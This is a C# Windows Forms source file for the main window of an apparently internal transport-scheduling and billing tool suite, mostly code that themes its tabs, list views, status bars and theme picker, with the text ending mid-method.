using MaterialSkin;
using MaterialSkin.Controls;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using System.Net.Sockets;
using ListView = System.Windows.Forms.ListView;
using System.Net;
using Newtonsoft.Json.Linq;
using System.Text;
using System.Web.UI.WebControls;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.IO;
using System.Reflection;
using SV;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolBar;
using System.Linq;
using Image = System.Drawing.Image;
using System.Globalization;
using Newtonsoft.Json;
using System.Windows.Forms.DataVisualization.Charting;
using System.Runtime.Remoting.Messaging;
using System.Web.UI;
using System.ComponentModel;
using static System.Net.Mime.MediaTypeNames;
using Application = System.Windows.Forms.Application;
using System.Threading;
using System.Windows.Forms.VisualStyles;
using System.Diagnostics;
using System.Media;
using Label = System.Windows.Forms.Label;
using System.Data.Entity.Core.Common.CommandTrees.ExpressionBuilder;
using System.Runtime.InteropServices;
using GMap.NET.MapProviders;
//using static System.Net.Mime.MediaTypeNames;

namespace Hiatme_Tool_Suite_v3
{
    public partial class Form1 : MaterialForm
    {
        // WIP tools — flip to true to show these tabs again (designer + code stay in place).
        private const bool ShowSupeyScheduleTab = false;
        private const bool ShowCameraTab = false;

        private bool manuallogin = false;
        /// <summary>True after WellRyde portal bootstrap (GET main page) succeeds.</summary>
        private bool _wellRydePanelSessionActive;

        private WellRydePortalSession _wellRydeSession;

        readonly MaterialSkinManager materialSkinManager;
        public System.Windows.Forms.Timer billtimer;

        MCLoginHandler mcLoginHandler;
        HiatmeLoginHandler hiatmeLoginHandler;

        WRBillingTool wrBillingTool;
        MCTimeCorrection mcTimeCorrectionTool;
        TemplateBuilder tbuilder;
        FullScheduleBuilder fsbuilder;

        EmployeeStatManager empStatManager;
        /// <summary>Cancels an in-flight Production tab load when the user switches away or opens the tab again.</summary>
        CancellationTokenSource _employeeStatsLoadCts;
        /// <summary>Set when the main form is closing so timers, sockets, and async retries stop cleanly.</summary>
        private volatile bool _applicationExitRequested;
        private readonly object _infoAlSocketsLock = new object();
        private readonly HashSet<Socket> _infoAlActiveSockets = new HashSet<Socket>();
        ReportCard reportCard;
        /// <summary>Must be initialized before <see cref="Form1"/> ctor body uses it (partial-class field order is not guaranteed if declared later in this file).</summary>
        readonly Analyzer analyzer = new Analyzer();

        private readonly object _revampFontLock = new object();
        private PrivateFontCollection _revampFontCollection;
        private Font _revampFontLargeR;
        private Font _revampFontRest;
        private bool _revampFontLoadAttempted;
        private Font _loginWatermarkTopFont;
        private Font _loginWatermarkBottomFont;
        /// <summary>Unmanaged copy of embedded font bytes; must stay allocated until <see cref="_revampFontCollection"/> is disposed (GDI+ requirement).</summary>
        private IntPtr _revampEmbeddedFontAlloc;

        private static int _startupMyPreciousPlayedFlag;

        /// <summary>
        /// Trip Scout's master result set for the currently-loaded date. <see cref="tssearchbox"/>
        /// filters this list in-memory on every keystroke and re-binds <see cref="tslv"/>; the
        /// underlying portal data is only refetched when the user clicks <see cref="tsloadbtn"/>.
        /// </summary>
        private List<WRDownloadedTrip> _tripScoutAllTrips = new List<WRDownloadedTrip>();
        private bool _tripScoutColumnsAutoFitDone;
        private System.Windows.Forms.Timer _tripScoutStatusSpinnerTimer;
        private int _tripScoutStatusSpinnerTick;
        private string _tripScoutStatusBaseMessage = "";
        private System.Windows.Forms.Panel _tripScoutToolbarPanel;
        private FlowLayoutPanel _tripScoutToolbarLeftFlow;
        private FlowLayoutPanel _tripScoutToolbarRightFlow;
        private System.Windows.Forms.Panel _templatesToolbarPanel;
        private SupeyButton _templatesAddBtn;
        private SupeyMapLoadingOverlay _tripScoutLoadingOverlay;
        private int _tripScoutLoadingDepth;
        private bool _tripScoutFirstLoadTriggered;
        private SupeyMapLoadingOverlay _analyzerLoadingOverlay;
        private int _analyzerLoadingDepth;
        private string _analyzerLoadingBaseMessage = "";

        /// <summary>
        /// Removes WIP tabs from <see cref="hiatmeTabControl"/> (and the Material drawer icons).
        /// Visible=false is not enough — the drawer still lists every tab page in the control.
        /// </summary>
        private void ApplyHiddenToolTabs()
        {
            if (hiatmeTabControl == null) return;

            // Designer order: … tabPage6, tabPageSupey, tabPage7 … tabPage9, tabPage3
            SetToolTabOnMainStrip(tabPageSupey, ShowSupeyScheduleTab, insertBefore: tabPage7);
            SetToolTabOnMainStrip(tabPage3, ShowCameraTab, appendToEnd: true);
        }

        private void SetToolTabOnMainStrip(TabPage page, bool show, TabPage insertBefore = null, bool appendToEnd = false)
        {
            if (page == null) return;
            bool onStrip = hiatmeTabControl.TabPages.Contains(page);
            if (show)
            {
                if (onStrip) return;
                if (appendToEnd)
                    hiatmeTabControl.TabPages.Add(page);
                else if (insertBefore != null)
                {
                    int idx = hiatmeTabControl.TabPages.IndexOf(insertBefore);
                    if (idx >= 0)
                        hiatmeTabControl.TabPages.Insert(idx, page);
                    else
                        hiatmeTabControl.TabPages.Add(page);
                }
                else
                    hiatmeTabControl.TabPages.Add(page);
            }
            else if (onStrip)
                hiatmeTabControl.TabPages.Remove(page);
        }

        public Form1()
        {
            // Login combo may raise SelectedIndexChanged during InitializeComponent; handlers must exist first.
            InitializeMCLoginHandler();
            InitializeHiatmeLoginHandler();
            InitializeComponent();;
            InitializeScheduleBuilderTab();
            ApplyHiddenToolTabs();
            // Tabs added after the designer-baked ImageStream need their icon injected before the first tab strip paint.
            RegisterRuntimeTabIcons();
            // Click-to-sort + smart cell typing on every custom-drawn listview. Default column resize already works.
            WireListViewSorters();
            if (listView1 != null)
                SupeyToolTip.WireListViewItems(listView1);
            // Eliminate the first-highlight gray-without-text flash on every ListView in this
            // form (designer-built and runtime-built alike). Touches only the protected
            // DoubleBuffered bit — colors, fonts, owner-draw, and themes are untouched.
            SupeyListViewHelpers.EnableDoubleBufferRecursively(this);
            // Replace the bright-gray default Win32 scrollbars with the dark
            // "DarkMode_Explorer" theme — square, flat, matches our SupeyTheme
            // ladder. Walks the whole control tree and hooks ControlAdded so
            // dynamically built panels (Supey tab, lazy tabs, dialogs) inherit
            // automatically.
            SupeyDarkScrollBars.Apply(this);
            BuildTimeCorrectionTripListContextMenu();
            // Trip Scout right-click menu inherits the listview's dark palette + gets generated person+badge icons.
            ApplyTripScoutContextMenuTheme();
            ApplyTripScoutVisualTheme();
            ApplyTemplatesVisualTheme();
            ApplyTimeCorrectionVisualTheme();
            // The MaterialForm body behind the tab control (3px margins + app-bar strip) defaults to
            // MaterialSkin's fixed gray; pin it to the palette base so no gray peeks through.
            BackColor = SupeyTheme.SurfaceBase;
            // Catch every MaterialCard / tab page / list that no per-tab theming method touched and
            // still paints MaterialSkin's fixed ~RGB(50,50,50) gray. Setting them to a palette surface
            // both kills the gray now AND makes them remappable by the live recolor walk on switch.
            ThemeUntouchedMaterialChrome(this);
            // Owner-draw the main tab bar in the Supey skin (themed strip, icons, lime active underline).
            SupeyTabStrip.Attach(hiatmeTabControl);
            // In-app theme switcher in the top bar + live recolor when the user picks a preset.
            BuildSupeyThemePicker();
            SupeyThemeManager.ThemeChanged += (s, e) => OnSupeyThemeChanged();
            // Build the Supey schedule tab UI programmatically (the designer placeholder is intentionally empty).
            if (ShowSupeyScheduleTab)
                InitializeSupeyTab();
            CheckForIllegalCrossThreadCalls = false;
            materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.EnforceBackcolorOnAllComponents = false;
            materialSkinManager.AddFormToManage(this);
            SupeyMaterialSkinBridge.ApplyTo(materialSkinManager);
            this.billinglistview.SizeChanged += new EventHandler(ListView_SizeChanged);
            tbuilder = new TemplateBuilder();
            tbuilder.UpdateLoadingScreen += loadinggifhandler_update;
            tbuilder.ShowLoadingScreen += loadinggifhandler_showscreen;
            tbuilder.HideLoadingScreen += loadinggifhandler_hidescreen;

            mcTimeCorrectionTool = new MCTimeCorrection(tccb);
            EnsureTimeCorrectionCompanyAccuracyUi();
            wrBillingTool = new WRBillingTool();

            //Connect_Setup();
            billtimer = new System.Windows.Forms.Timer();
            billtimer.Tick += billtimer_Tick;
            billtimer.Interval = 10000; //milisecunde

            if (billingmmcb != null)
                billingmmcb.CheckStateChanged += BillingOptions_ChangedRefreshCharts;
            if (billingallcb != null)
                billingallcb.CheckStateChanged += BillingOptions_ChangedRefreshCharts;

            if (billingstatuspanel != null)
            {
                billingstatuspanel.Resize += (_, __) => LayoutStatusLabelInCard(billingstatuspanel, billingstatuslbl);
                LayoutStatusLabelInCard(billingstatuspanel, billingstatuslbl);
            }
            if (materialCard10 != null)
                materialCard10.Resize += (_, __) => LayoutStatusLabelInCard(materialCard10, tcorrectstatuslbl);

            analyzer.UpdateLoadingScreen += analyzer_loading_update;
            analyzer.ShowLoadingScreen += analyzer_loading_show;
            analyzer.HideLoadingScreen += analyzer_loading_hide;

            portlbl.Text = portlbl.Text + port_no.ToString();
            // Default login provider is set in the designer before SelectedIndexChanged is wired; sync saved credentials once at show.
            Shown += Form1_Shown_SyncLoginPanelFromSettings;
            Load += Form1_OnLoad_DeferRevampPaintHook;
        }

        /// <summary>
        /// Wires <see cref="ListViewSorter"/> (click-to-sort) and <see cref="ListViewMinWidthEnforcer"/>
        /// (per-column min-width clamp at <c>max(header, widest cell) + padding</c>) onto every
        /// custom-drawn listview. Must run after <c>InitializeComponent</c>; safe to call once.
        /// </summary>
        private void WireListViewSorters()
        {
            ListView[] lists =
            {
                billinglistview,
                tctripcorrectlv,
                tcbatchelinkslv,
                templatelv,
                aalv,
                tslv,
                listView1,
            };
            foreach (var lv in lists)
            {
                if (lv == null) continue;
                ListViewSorter.Attach(lv);
                ListViewMinWidthEnforcer.Attach(lv);
                ListViewHeaderEmptyAreaPainter.Attach(lv);
            }

            if (billinglistview != null)
                ListViewMinWidthEnforcer.SetColumnFloor(billinglistview, 13, 500);

            if (tsColAlerts != null)
            {
                tsColAlerts.Tag = "hidden";
                tsColAlerts.Width = 0;
            }

            ConfigureTripScoutColumnWidths();
        }

        private void ConfigureTripScoutColumnWidths()
        {
            if (tslv == null) return;
            SetTripScoutColumnCeiling(tsColClient, 170);
            SetTripScoutColumnCeiling(tsColDriver, 140);
            SetTripScoutColumnCeiling(tsColPUStreet, 180);
            SetTripScoutColumnCeiling(tsColPUCity, 110);
            SetTripScoutColumnCeiling(tsColDOStreet, 180);
            SetTripScoutColumnCeiling(tsColDOCity, 110);
            // Search rebinds swap rows in memory; don't refit widths on every keystroke.
            ListViewMinWidthEnforcer.SetContentAutoFit(tslv, false);
        }

        private void SetTripScoutColumnCeiling(ColumnHeader column, int maxPixels)
        {
            if (column == null || tslv == null || maxPixels <= 0) return;
            int index = tslv.Columns.IndexOf(column);
            if (index >= 0)
                ListViewMinWidthEnforcer.SetColumnCeiling(tslv, index, maxPixels);
        }

        /// <summary>
        /// Skin <see cref="tsTripContextMenu"/> to match the listview body (RGB 70/70/70 fill, white
        /// text, RoyalBlue hover) and slot the generated assign/unassign icons onto the items.
        /// Safe to call once after <c>InitializeComponent</c>.
        /// </summary>
        private void ApplyTripScoutContextMenuTheme()
        {
            if (tsTripContextMenu == null) return;
            tsTripContextMenu.Renderer = new DarkContextMenuRenderer();
            tsTripContextMenu.BackColor = DarkContextMenuRenderer.Background;
            tsTripContextMenu.ForeColor = DarkContextMenuRenderer.ForeColor;
            tsTripContextMenu.ShowImageMargin = true;
            foreach (ToolStripItem item in tsTripContextMenu.Items)
            {
                item.BackColor = DarkContextMenuRenderer.Background;
                item.ForeColor = DarkContextMenuRenderer.ForeColor;
            }
            if (tsTripCtxAssign != null) tsTripCtxAssign.Image = MenuIconFactory.GetAssignIcon();
            if (tsTripCtxUnassign != null) tsTripCtxUnassign.Image = MenuIconFactory.GetUnassignIcon();
            if (tsTripCtxLocate != null) tsTripCtxLocate.Image = MenuIconFactory.GetLocateIcon();
        }

        /// <summary>
        /// Makes Trip Scout visually match the Schedule Builder toolbar rhythm.
        /// Styling only — no behavior changes.
        /// </summary>
        /// <summary>
        /// Walks the whole control tree and themes any MaterialCard / TabPage / ListView that is still
        /// showing MaterialSkin's fixed dark-gray default (i.e. whose BackColor is NOT already one of
        /// the active palette surfaces). Controls a per-tab Apply* method already themed are left alone
        /// so their nuanced surfaces (status bars, dividers) survive. Run once at startup; afterwards
        /// every touched control carries a palette color, so <see cref="SupeyThemeApplier"/> remaps it
        /// on theme switches automatically.
        /// </summary>
        private void ThemeUntouchedMaterialChrome(System.Windows.Forms.Control root)
        {
            if (root == null) return;

            foreach (System.Windows.Forms.Control c in root.Controls)
            {
                switch (c)
                {
                    case MaterialSkin.Controls.MaterialCard card:
                        if (!IsPaletteSurface(card.BackColor))
                        {
                            card.BackColor = SupeyTheme.SurfaceBase;
                            card.ForeColor = SupeyTheme.TextPrimary;
                        }
                        break;
                    case TabPage page:
                        if (!IsPaletteSurface(page.BackColor))
                        {
                            page.BackColor = SupeyTheme.SurfaceBase;
                            page.ForeColor = SupeyTheme.TextPrimary;
                        }
                        break;
                    case ListView lv:
                        if (!IsPaletteSurface(lv.BackColor))
                        {
                            lv.BackColor = SupeyTheme.ListBody;
                            lv.ForeColor = SupeyTheme.ListText;
                        }
                        break;
                    case System.Windows.Forms.Panel pnl:
                        // Only retint panels still on the MaterialSkin default gray; leave deliberately
                        // colored panels (palette surfaces, accent strips, semantic fills) untouched.
                        if (!IsPaletteSurface(pnl.BackColor) && IsMaterialDefaultGray(pnl.BackColor))
                            pnl.BackColor = SupeyTheme.SurfaceBase;
                        break;
                }

                if (c.HasChildren)
                    ThemeUntouchedMaterialChrome(c);
            }
        }

        /// <summary>True if <paramref name="c"/> matches one of the active palette's surface tones.</summary>
        private static bool IsPaletteSurface(Color c)
        {
            int argb = c.ToArgb();
            return argb == SupeyTheme.SurfaceBase.ToArgb()
                || argb == SupeyTheme.Surface.ToArgb()
                || argb == SupeyTheme.SurfaceElevated.ToArgb()
                || argb == SupeyTheme.SurfaceHeader.ToArgb()
                || argb == SupeyTheme.SurfaceStatusBar.ToArgb()
                || argb == SupeyTheme.ListBody.ToArgb()
                || argb == SupeyTheme.ListBodyAlt.ToArgb()
                || argb == SupeyTheme.ListHeader.ToArgb();
        }

        /// <summary>
        /// MaterialSkin's DARK theme paints cards/forms with a fixed gray (~RGB 50,50,50). Detect it
        /// (with a little tolerance) plus the WinForms default control gray so we only retint chrome
        /// that was never themed, not panels we colored on purpose.
        /// </summary>
        private static bool IsMaterialDefaultGray(Color c)
        {
            if (c == SystemColors.Control || c == SystemColors.ControlDark) return true;
            // MaterialSkin dark background and its elevation variants cluster around 45–55 gray.
            return c.R == c.G && c.G == c.B && c.R >= 40 && c.R <= 60;
        }

        private void ApplyTripScoutVisualTheme()
        {
            if (tabPage9 != null)
                tabPage9.BackColor = SupeyTheme.SurfaceBase;

            if (tsmaterialCard != null)
            {
                tsmaterialCard.BackColor = SupeyTheme.SurfaceBase;
                tsmaterialCard.ForeColor = SupeyTheme.TextPrimary;
                tsmaterialCard.Padding = new Padding(0);
            }

            if (tsstatuspanel != null)
            {
                tsstatuspanel.Visible = true;
                tsstatuspanel.BackColor = SupeyTheme.SurfaceHeader;
                tsstatuspanel.ForeColor = SupeyTheme.TextPrimary;
                tsstatuspanel.Padding = new Padding(0);

                var fill = tsstatuspanel.Controls["tsStatusFillPanel"] as System.Windows.Forms.Panel;
                if (fill == null)
                {
                    fill = new System.Windows.Forms.Panel
                    {
                        Name = "tsStatusFillPanel",
                        Dock = DockStyle.Fill,
                        BackColor = SupeyTheme.SurfaceStatusBar,
                        Padding = new Padding(10, 0, 10, 0),
                    };
                    tsstatuspanel.Controls.Add(fill);
                }
                else
                {
                    fill.BackColor = SupeyTheme.SurfaceStatusBar;
                }

                var divider = fill.Controls["tsStatusTopDivider"] as System.Windows.Forms.Panel;
                if (divider == null)
                {
                    divider = new System.Windows.Forms.Panel
                    {
                        Name = "tsStatusTopDivider",
                        Dock = DockStyle.Top,
                        Height = 1,
                        BackColor = SupeyTheme.Divider,
                    };
                    fill.Controls.Add(divider);
                    divider.BringToFront();
                }

                fill.Resize += (_, __) => LayoutStatusLabelInCard(fill, tsstatuslbl);
            }

            if (tsstatuslbl != null)
            {
                var fill = tsstatuspanel?.Controls["tsStatusFillPanel"] as System.Windows.Forms.Panel;
                if (fill != null && !ReferenceEquals(tsstatuslbl.Parent, fill))
                    fill.Controls.Add(tsstatuslbl);
                tsstatuslbl.AutoSize = false;
                tsstatuslbl.ForeColor = SupeyTheme.TextSecondary;
                tsstatuslbl.Font = SupeyTheme.BodyFont;
                tsstatuslbl.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
                tsstatuslbl.BackColor = SupeyTheme.SurfaceStatusBar;
                LayoutStatusLabelInCard(fill ?? tsstatuspanel, tsstatuslbl);
            }

            if (tslv != null)
            {
                tslv.BackColor = SupeyTheme.ListBody;
                tslv.ForeColor = SupeyTheme.ListText;
                tslv.Font = ListViewOwnerDrawFonts.Cell;
                tslv.GridLines = true;
                tslv.Dock = DockStyle.Fill;
            }

            EnsureTripScoutToolbarChrome();
        }

        /// <summary>
        /// Keeps the Templates tab visually aligned with the Schedule Builder/Trip Scout dark chrome.
        /// Styling only — no template workflow behavior changes.
        /// </summary>
        private void ApplyTemplatesVisualTheme()
        {
            if (tabPage5 != null)
            {
                tabPage5.BackColor = SupeyTheme.SurfaceBase;
                tabPage5.ForeColor = SupeyTheme.TextPrimary;
            }

            if (materialCard12 != null)
            {
                materialCard12.BackColor = SupeyTheme.SurfaceBase;
                materialCard12.ForeColor = SupeyTheme.TextPrimary;
                materialCard12.Padding = new Padding(12, 10, 12, 10);
            }

            if (materialCard13 != null)
            {
                materialCard13.Visible = true;
                materialCard13.BackColor = SupeyTheme.SurfaceHeader;
                materialCard13.ForeColor = SupeyTheme.TextPrimary;
                materialCard13.Padding = new Padding(0);

                var fill = materialCard13.Controls["tbStatusFillPanel"] as System.Windows.Forms.Panel;
                if (fill == null)
                {
                    fill = new System.Windows.Forms.Panel
                    {
                        Name = "tbStatusFillPanel",
                        Dock = DockStyle.Fill,
                        BackColor = SupeyTheme.SurfaceStatusBar,
                        Padding = new Padding(10, 0, 10, 0),
                    };
                    materialCard13.Controls.Add(fill);
                }
                else
                {
                    fill.BackColor = SupeyTheme.SurfaceStatusBar;
                }

                var divider = fill.Controls["tbStatusTopDivider"] as System.Windows.Forms.Panel;
                if (divider == null)
                {
                    divider = new System.Windows.Forms.Panel
                    {
                        Name = "tbStatusTopDivider",
                        Dock = DockStyle.Top,
                        Height = 1,
                        BackColor = SupeyTheme.Divider,
                    };
                    fill.Controls.Add(divider);
                    divider.BringToFront();
                }

                fill.Resize += (_, __) => LayoutStatusLabelInCard(fill, tbstatuslbl);
                materialCard13.Resize -= MaterialCard13_ResizeTemplateStatus;
                materialCard13.Resize += MaterialCard13_ResizeTemplateStatus;
            }

            if (tbstatuslbl != null)
            {
                var fill = materialCard13?.Controls["tbStatusFillPanel"] as System.Windows.Forms.Panel;
                if (fill != null && !ReferenceEquals(tbstatuslbl.Parent, fill))
                    fill.Controls.Add(tbstatuslbl);
                tbstatuslbl.AutoSize = false;
                tbstatuslbl.ForeColor = SupeyTheme.TextSecondary;
                tbstatuslbl.Font = SupeyTheme.BodyFont;
                tbstatuslbl.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
                tbstatuslbl.BackColor = SupeyTheme.SurfaceStatusBar;
                LayoutStatusLabelInCard(fill ?? materialCard13, tbstatuslbl);
            }

            if (templatelv != null)
            {
                templatelv.BackColor = SupeyTheme.ListBody;
                templatelv.ForeColor = SupeyTheme.ListText;
                templatelv.GridLines = true;
                templatelv.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
                templatelv.Location = new Point(18, 86);
            }

            if (tbcb != null)
            {
                tbcb.BackColor = SupeyTheme.SurfaceElevated;
                tbcb.ForeColor = SupeyTheme.TextPrimary;
            }

            if (tbtemplatenamecb != null)
            {
                tbtemplatenamecb.BackColor = SupeyTheme.SurfaceElevated;
                tbtemplatenamecb.ForeColor = SupeyTheme.TextPrimary;
            }

            if (addtemplatebtn != null)
            {
                // Replaced visually by SupeyButton to match Schedule Builder BUILD chrome.
                addtemplatebtn.Visible = false;
            }

            EnsureTemplatesToolbarChrome();
        }

        private void MaterialCard13_ResizeTemplateStatus(object sender, EventArgs e)
        {
            var fill = materialCard13?.Controls["tbStatusFillPanel"] as System.Windows.Forms.Panel;
            LayoutStatusLabelInCard(fill ?? materialCard13, tbstatuslbl);
        }

        /// <summary>
        /// Dark-themes the Time Correction tab (tabPage4): content cards, the control-panel
        /// card with its flat combo + Find/Load/Execute buttons, both owner-drawn list views,
        /// the bottom status strip, and the accuracy chart. Styling only — no behavior changes.
        /// </summary>
        private void ApplyTimeCorrectionVisualTheme()
        {
            if (tabPage4 != null)
            {
                tabPage4.BackColor = SupeyTheme.SurfaceBase;
                tabPage4.ForeColor = SupeyTheme.TextPrimary;
            }

            // Content cards (batch list host, trip list, chart) sit flush on the base surface so
            // the tab reads as one flat dark panel (like Schedule Builder) instead of a grid of
            // lighter gray cards floating on a darker background.
            foreach (var card in new[] { materialCard8, materialCard9, materialCard11 })
            {
                if (card == null) continue;
                card.BackColor = SupeyTheme.SurfaceBase;
                card.ForeColor = SupeyTheme.TextPrimary;
            }

            // The control-panel card reads as a small header strip.
            if (materialCard19 != null)
            {
                materialCard19.BackColor = SupeyTheme.SurfaceHeader;
                materialCard19.ForeColor = SupeyTheme.TextPrimary;
            }

            if (materialLabel1 != null)
            {
                materialLabel1.ForeColor = SupeyTheme.TextSecondary;
                materialLabel1.BackColor = SupeyTheme.SurfaceHeader;
                materialLabel1.Font = SupeyTheme.BodyFont;
            }

            // Flat dark combo (reuses the Templates combo configuration + owner-draw rows).
            if (tccb != null)
            {
                ConfigureTemplatesCombo(tccb, 232);
                // Restore the default selection (Modivcare) that the old Material combo showed.
                if (tccb.SelectedIndex < 0 && tccb.Items.Count > 0)
                {
                    int idx = tccb.Items.IndexOf("Modivcare");
                    tccb.SelectedIndex = idx >= 0 ? idx : 0;
                }
            }

            // Flat buttons, primary accent reserved for the Execute action.
            if (tcfindbatchesbtn != null) tcfindbatchesbtn.Kind = SupeyButton.Variant.Secondary;
            if (tcloadbtn != null) tcloadbtn.Kind = SupeyButton.Variant.Secondary;
            if (tcexebtn != null) tcexebtn.Kind = SupeyButton.Variant.Primary;
            LayoutTimeCorrectionControlPanel();

            // Owner-drawn lists pick up the shared SupeyTheme palette (see ListView draw handlers).
            foreach (var lv in new[] { tctripcorrectlv, tcbatchelinkslv })
            {
                if (lv == null) continue;
                lv.BackColor = SupeyTheme.ListBody;
                lv.ForeColor = SupeyTheme.ListText;
                lv.GridLines = true;
                lv.BorderStyle = System.Windows.Forms.BorderStyle.None;
            }

            // Bottom status strip, styled like the other tabs.
            if (materialCard10 != null)
            {
                materialCard10.BackColor = SupeyTheme.SurfaceHeader;
                materialCard10.ForeColor = SupeyTheme.TextPrimary;
                materialCard10.Padding = new Padding(0);

                var fill = materialCard10.Controls["tcStatusFillPanel"] as System.Windows.Forms.Panel;
                if (fill == null)
                {
                    fill = new System.Windows.Forms.Panel
                    {
                        Name = "tcStatusFillPanel",
                        Dock = DockStyle.Fill,
                        BackColor = SupeyTheme.SurfaceStatusBar,
                        Padding = new Padding(10, 0, 10, 0),
                    };
                    materialCard10.Controls.Add(fill);
                }
                else
                {
                    fill.BackColor = SupeyTheme.SurfaceStatusBar;
                }

                var divider = fill.Controls["tcStatusTopDivider"] as System.Windows.Forms.Panel;
                if (divider == null)
                {
                    divider = new System.Windows.Forms.Panel
                    {
                        Name = "tcStatusTopDivider",
                        Dock = DockStyle.Top,
                        Height = 1,
                        BackColor = SupeyTheme.Divider,
                    };
                    fill.Controls.Add(divider);
                    divider.BringToFront();
                }

                if (tcorrectstatuslbl != null)
                {
                    if (!ReferenceEquals(tcorrectstatuslbl.Parent, fill))
                        fill.Controls.Add(tcorrectstatuslbl);
                    tcorrectstatuslbl.AutoSize = false;
                    tcorrectstatuslbl.ForeColor = SupeyTheme.TextSecondary;
                    tcorrectstatuslbl.Font = SupeyTheme.BodyFont;
                    tcorrectstatuslbl.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
                    tcorrectstatuslbl.BackColor = SupeyTheme.SurfaceStatusBar;
                    LayoutStatusLabelInCard(fill, tcorrectstatuslbl);
                }

                materialCard10.Resize -= MaterialCard10_ResizeTcStatus;
                materialCard10.Resize += MaterialCard10_ResizeTcStatus;
            }

            ApplyTimeCorrectionChartTheme();

            // The form-level dark-scrollbar walk runs before this tab's controls have window
            // handles, so its list views keep bright-gray native scrollbars and a light header
            // strip past the last column. Re-apply here (idempotent) and once more the first time
            // the tab is shown — exactly how the Supey and Schedule Builder tabs do it.
            if (tabPage4 != null)
            {
                SupeyDarkScrollBars.Apply(tabPage4);
                tabPage4.VisibleChanged -= TabPage4_ApplyDarkScrollOnShow;
                tabPage4.VisibleChanged += TabPage4_ApplyDarkScrollOnShow;
            }
        }

        private void TabPage4_ApplyDarkScrollOnShow(object sender, EventArgs e)
        {
            if (tabPage4 != null && tabPage4.Visible)
                SupeyDarkScrollBars.Apply(tabPage4);
        }

        private SupeyButton _themePickerBtn;
        private ContextMenuStrip _themePickerMenu;

        /// <summary>
        /// Builds the top-bar theme switcher: a ghost button showing the active preset that opens a
        /// dark menu of all built-in presets. Selecting one applies + persists it and live-recolors.
        /// </summary>
        private void BuildSupeyThemePicker()
        {
            try
            {
                _themePickerMenu = new ContextMenuStrip { Renderer = new DarkContextMenuRenderer() };
                RebuildThemeMenuItems();

                _themePickerBtn = new SupeyButton
                {
                    Kind = SupeyButton.Variant.Ghost,
                    Text = "Theme: " + SupeyThemeManager.Current.Name,
                    Size = new Size(190, 30),
                    Anchor = AnchorStyles.Top | AnchorStyles.Right,
                    ForeColor = SupeyTheme.TextPrimary,
                };
                _themePickerBtn.Location = new Point(Math.Max(8, ClientSize.Width - _themePickerBtn.Width - 150), 17);
                _themePickerBtn.Click += (s, e) =>
                {
                    if (_themePickerMenu != null)
                        _themePickerMenu.Show(_themePickerBtn, new Point(0, _themePickerBtn.Height));
                };

                Controls.Add(_themePickerBtn);
                _themePickerBtn.BringToFront();
            }
            catch
            {
                // The picker is a convenience; never let it block startup.
            }
        }

        private void RebuildThemeMenuItems()
        {
            if (_themePickerMenu == null) return;
            _themePickerMenu.Items.Clear();
            foreach (string name in SupeyThemeManager.PresetNames)
            {
                string presetName = name;
                var item = new ToolStripMenuItem(presetName)
                {
                    BackColor = DarkContextMenuRenderer.Background,
                    ForeColor = DarkContextMenuRenderer.ForeColor,
                    Checked = string.Equals(presetName, SupeyThemeManager.Current.Name, StringComparison.OrdinalIgnoreCase),
                };
                item.Click += (s, e) => SupeyThemeManager.Apply(presetName);
                _themePickerMenu.Items.Add(item);
            }
        }

        /// <summary>Live-recolor the whole window when the active theme changes.</summary>
        private void OnSupeyThemeChanged()
        {
            if (IsDisposed) return;
            if (InvokeRequired)
            {
                try { BeginInvoke(new Action(OnSupeyThemeChanged)); } catch { }
                return;
            }

            try
            {
                BackColor = SupeyTheme.SurfaceBase;
                SupeyThemeApplier.Recolor(this);

                if (hiatmeTabControl != null)
                {
                    hiatmeTabControl.BackColor = SupeyTheme.SurfaceHeader;
                    hiatmeTabControl.Invalidate();
                }

                if (_themePickerBtn != null && !_themePickerBtn.IsDisposed)
                {
                    _themePickerBtn.Text = "Theme: " + SupeyThemeManager.Current.Name;
                    _themePickerBtn.ForeColor = SupeyTheme.TextPrimary;
                }
                RebuildThemeMenuItems();

                // Dark scrollbars are HWND-themed, not color-mapped, so they don't need remapping;
                // re-assert anyway so any freshly themed surface keeps matching chrome.
                SupeyDarkScrollBars.Apply(this);
                Invalidate(true);
            }
            catch
            {
                // Recolor is best-effort; a partial repaint is better than crashing the UI thread.
            }
        }

        private void MaterialCard10_ResizeTcStatus(object sender, EventArgs e)
        {
            var fill = materialCard10?.Controls["tcStatusFillPanel"] as System.Windows.Forms.Panel;
            LayoutStatusLabelInCard(fill ?? materialCard10, tcorrectstatuslbl);
        }

        // Lays out the control-panel card (label, combo, three action buttons) on a tidy grid.
        private void LayoutTimeCorrectionControlPanel()
        {
            if (materialCard19 == null || materialCard19.IsDisposed)
                return;

            const int left = 18;
            const int right = 18;
            const int gap = 8;
            int w = materialCard19.Width;

            if (materialLabel1 != null && !materialLabel1.IsDisposed)
                materialLabel1.Location = new Point(left, 18);

            if (tccb != null && !tccb.IsDisposed)
                tccb.SetBounds(left, 46, Math.Max(120, w - left - right), 30);

            int avail = Math.Max(150, w - left - right - (gap * 2));
            int bw = avail / 3;
            int btnY = 96;
            const int btnH = 30;

            if (tcfindbatchesbtn != null && !tcfindbatchesbtn.IsDisposed)
                tcfindbatchesbtn.SetBounds(left, btnY, bw, btnH);
            if (tcloadbtn != null && !tcloadbtn.IsDisposed)
                tcloadbtn.SetBounds(left + bw + gap, btnY, bw, btnH);
            if (tcexebtn != null && !tcexebtn.IsDisposed)
                tcexebtn.SetBounds(left + (2 * (bw + gap)), btnY, avail - (2 * bw), btnH);
        }

        private void ApplyTimeCorrectionChartTheme()
        {
            if (tcchart == null || tcchart.IsDisposed)
                return;

            tcchart.BackColor = SupeyTheme.Surface;
            tcchart.BorderlineColor = SupeyTheme.Divider;

            foreach (var area in tcchart.ChartAreas)
            {
                area.BackColor = SupeyTheme.Surface;
                foreach (var axis in new[] { area.AxisX, area.AxisY })
                {
                    axis.LineColor = SupeyTheme.Divider;
                    axis.LabelStyle.ForeColor = SupeyTheme.TextSecondary;
                    axis.TitleForeColor = SupeyTheme.TextSecondary;
